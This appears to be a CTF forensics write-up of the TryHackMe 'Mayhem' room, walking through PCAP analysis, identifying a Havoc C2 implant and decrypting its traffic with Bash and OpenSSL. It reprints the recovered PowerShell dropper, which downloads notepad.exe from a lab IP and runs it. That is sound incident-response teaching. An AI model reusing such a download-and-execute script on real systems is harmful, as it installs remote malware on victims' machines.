---
layout: post
title: Mayhem THM Writeup
date: 24-04-2025
categories: [THM, writeup]
tag: [Forensics, DFIR, THM]
---


# 🕵️‍♂️ Mayhem CTF Forensics Tryhackme

Ever cracked open a PCAP and uncovered a full-on malware operation hiding in plain sight? That’s exactly what this challenge was all about. From suspicious PowerShell scripts to sneaky HTTP traffic and full Havoc C2 decryption, this forensic journey had it all. I’ll walk you through how I broke it down — from protocol analysis to automating the entire decryption process with a bit of Bash magic. Let’s dive into the chaos of Mayhem.

![Mayhem](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-12.png)


## 📘 Challenge Overview

**Room Link:** [Mayhem](https://tryhackme.com/room/mayhemroom)

> Beneath the tempest's roar, a quiet grace,
> Mayhem's beauty in a hidden place.
> Within the chaos, a paradox unfolds,
> A tale of beauty, in disorder it molds.

---

## 🔍 Initial Network Analysis

1. Opened the PCAP file in **Wireshark**.
![Traffic -Wireshark](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image.png)
2. Navigated to **Statistics → Protocol Hierarchy** to understand the traffic distribution.
![Protocol Hierarchy Statistics](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-1.png)
3. Noticed a large amount of **HTTP traffic** — a potential channel for C2.

---

## 📦 Suspicious File Transfers

Following the most active HTTP streams revealed:

- Two files were transferred:
  - `install.ps1`
  - `notepad.exe`
![insatll.ps1 file](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-2.png)
The PowerShell script `install.ps1` initiated the download of `notepad.exe`.
![notepad.exe file](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-3.png)
Using **Follow HTTP Stream** in Wireshark:
- Confirmed the download behavior.
- Exported both files from the PCAP.
![install.ps1 content from HTTP stream](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-4.png)


- Rewrited `Install.ps1`
    ```powershell
    $URL = "http://10.0.2.37:1337/notepad.exe";
    $Download_PATH = "C:\Users\paco\Downloads\notepad.exe";
    Invoke-WebRequest -Uri $URL -OutFile $Download_PATH;
    $downloader = New-Object System.Net.WebClient;
    $downloader.DownloadFile($URL, $Download_PATH);
    Start-Process -Filepath $Download_PATH
    ```
![File export](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-6.png)

---

## 🔥 Malware Detection

After extraction:

- Generated the hash of `notepad.exe`.

    ![notepad.exe hash](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-7.png)

- Checked the hash on a **Threat Intelligence Platform** (e.g., VirusTotal).

    ![VT Check](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-8.png)

**Result:**  
The file was confirmed to be malicious — identified as a **Havoc C2**.

---

## 🧠 Research & C2 Decryption

Conducted research and found:

- An open-source **Havoc C2** repository on GitHub - [Havoc Implementation](https://github.com/HavocFramework/Havoc)
- Documentation explaining the encryption logic (AES-based) - [Havoc Forensics](https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide)
- A decryption script included in the repo - [Havoc C2 Forensics Github Tool](https://github.com/Immersive-Labs-Sec/HavocC2-Forensics)

### Steps Taken:

- Studied how the decryption routine works.
- Extracted **AES keys** from the traffic the first request after notepad.exe
![Magic Byte Havoc](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/magic_bytes-1.png)

    ```bash
    [+] Key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
    [+] IV: 8cd00c3e349290565aaa5a8c3aacd430
    ```

- Used **CyberChef** to manually decode the first 4 C2 packets.
    ![Cyberchef Decyrption](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-9.png)

### Observations:

- After few decryption of traffic, I noticed that each command from the attacker was followed by two responses:
  - An `HTTP/Response`
  - Two `HTTP/Request` packets
- Packets appeared **out of order**, requiring manual reassembly for accurate decryption.

---

## 🛠️ Automation via Bash Script

To automate and simplify the process:

- I Wrote a **Bash script** to:
  - Automatically extract AES keys
    ```bash
        # PCAP file to analyze
        PCAP="traffic.pcapng"

        # Function to parse HAVOC request header
        parse_header() {
        local hex="$1"

        # Extract fields based on byte sizes (in hex characters)
        length_field="${hex:0:8}"       # 4 bytes
        magic_byte="${hex:8:8}"         # 4 bytes
        agent_id="${hex:16:8}"          # 4 bytes
        ignore="${hex:24:16}"           # 8 bytes
        declare -g AES_KEY="${hex:40:64}"  # 32 bytes
        declare -g AES_IV="${hex:104:32}"  # 16 bytes

        length_dec=$((16#$length_field))

        if [[ "$magic_byte" == "deadbeef" ]]; then
            echo -e "\n✅ Magic bytes matched! - ${RED}Havoc has been detected${NC}\n"
            echo -e "  [-] Length Field : ${length_dec}"
            echo -e "${GREEN}  [-] Magic Bytes  : ${magic_byte}${NC}"
            echo -e "  [-] Agent ID     : ${agent_id}"
            echo -e "${RED}  [-] AES Key      : ${AES_KEY}"
            echo -e "  [-] AES IV       : ${AES_IV}${NC}"
        else
            echo "❌ Magic bytes mismatch (expected deadbeef, got $magic_byte)"
        fi
        }

    ```
  - Reassemble HTTP packet streams in correct order and map the reuqets with its answers and delete the empty packets.
    - the request content length != 20 and delete the 40 first bits
        ```bash
            echo "${REQUEST_1:40}" | xxd -r -p | decrypt
        ```
    - The response content length != 12 and delte the 24 first bits
        ```bash
            echo "${RESPONSE:24}" | xxd -r -p | decrypt
        ```
  - Decrypt payloads using embedded decryption logic (compatible with CyberChef or OpenSSL) 
    ```bash
    # Function to decrypt payloads using OpenSSL AES-256-CTR
    decrypt() {
    openssl enc -d -aes-256-ctr -K "$AES_KEY" -iv "$AES_IV" 2>/dev/null
    }
    ```

This enabled complete C2 traffic decryption.
    
![Header Parsing](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-10.png)

![Traffic Decryption](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-11.png)
---

## ✅ Outcome

Successfully:

- Identified malware deployment via `PowerShell`
- Detected and classified the payload as `Havoc C2`
- Decrypted the `command-and-control` traffic

---

## 🧰 Tools Used

- `Wireshark`
- `tshark`
- `CyberChef`
- `Bash`
- `VirusTotal`
- GitHub (Havoc C2 source)

---

## 📂 Artifacts

- `install.ps1`  - Sha1 hash: `2628320d154dff702ca2a4674af0432f6f08161a`
- `notepad.exe` (Havoc Payload)  - SHA1 Hash: `cdbab09ab27234cbd0739c438f4a96f6f7b53f50`
- Extracted AES Keys:
    - AES Key: `946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca`
    - IV Key: `8cd00c3e349290565aaa5a8c3aacd430`
- Decrypted C2 traffic  
- Bash automation script

---

## ✍️ Notes

- The decryption technique leveraged public information about Havoc’s encryption method.
- HTTP traffic order was inconsistent — proper stream ordering was key to successful decoding.

---

> 🏁 *Flag successfully retrieved through decrypted traffic.*


